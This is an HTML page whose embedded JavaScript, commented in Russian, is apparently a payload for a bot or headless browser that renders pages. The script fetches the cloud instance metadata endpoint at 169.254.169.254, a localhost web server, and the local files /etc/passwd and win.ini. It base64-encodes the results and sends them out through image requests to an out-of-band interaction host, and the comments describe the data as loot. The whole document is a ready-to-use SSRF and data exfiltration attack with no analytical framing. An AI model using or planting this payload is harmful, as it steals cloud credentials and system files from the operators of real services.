<!DOCTYPE html>
<html>
<body>
    <script>
        const oast = "http://esqbwjbyepcxrsacleqflghezhfek89a4.oast.fun";

        async function exfiltrate(url, label) {
            try {
                // Пытаемся забрать данные с внутреннего ресурса
                const response = await fetch(url, {
                    method: 'GET',
                    mode: 'no-cors' // Пробуем так, если обычный заблокирует
                });
                
                // Если не удалось прочитать текст напрямую из-за CORS, 
                // пробуем через стандартный fetch для получения контента
                const res = await fetch(url);
                const data = await res.text();
                
                // Кодируем в Base64, чтобы спецсимволы не сломали URL
                const encoded = btoa(unescape(encodeURIComponent(data))).substring(0, 1000); 
                
                // Отправляем награбленное на OAST
                new Image().src = `${oast}/DATA_${label}?content=${encoded}`;
            } catch (err) {
                new Image().src = `${oast}/ERROR_${label}?msg=${btoa(err.message)}`;
            }
        }

        // 1. Пытаемся достать метаданные (Azure/Google/AWS стиль)
        // Для Azure часто нужен заголовок Metadata: true, но начнем с простого
        exfiltrate("http://169.254.169.254/latest/meta-data/", "METADATA_ROOT");
        
        // 2. Пытаемся прочитать локальный веб-сервер, который мы нашли на 80 порту
        exfiltrate("http://127.0.0.1:80/", "LOCAL_HOST_80");

        // 3. Пытаемся прочитать файл через file:// (если бот позволяет)
        exfiltrate("file:///etc/passwd", "ETC_PASSWD");
        exfiltrate("file:///C:/Windows/win.ini", "WIN_INI");

    </script>
</body>
</html>
